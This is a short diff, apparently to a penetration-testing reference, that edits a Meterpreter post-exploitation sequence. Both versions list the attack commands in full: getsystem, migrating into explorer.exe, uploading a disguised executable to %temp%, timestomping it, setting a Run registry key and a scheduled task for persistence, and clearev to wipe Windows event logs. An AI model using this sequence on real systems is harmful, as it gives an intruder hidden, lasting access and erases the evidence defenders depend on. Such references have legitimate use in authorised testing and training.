@@ -112,10 +112,10 @@
 
       getsystem
       run migrate -n explorer.exe
-      upload flash-update.exe %temp%\\flash-update.exe
-      timestomp -z '3/10/1999 15:15:15' %temp%\\flash-update.exe
-      reg setval -k HKLM\\Software\\Microsoft\\Windows\\Currentversion\\Run -v flash-update -d %temp%\flash-update.exe
-      run scheduleme -m 10 -c "%temp%\\flash-update.exe"
+      upload update.exe %temp%\\update.exe
+      timestomp -z '3/10/1999 15:15:15' %temp%\\update.exe
+      reg setval -k HKLM\\Software\\Microsoft\\Windows\\Currentversion\\Run -v flash-update -d %temp%\\update.exe
+      run scheduleme -m 10 -c "%temp%\\update.exe"
       clearev
 
 <br />
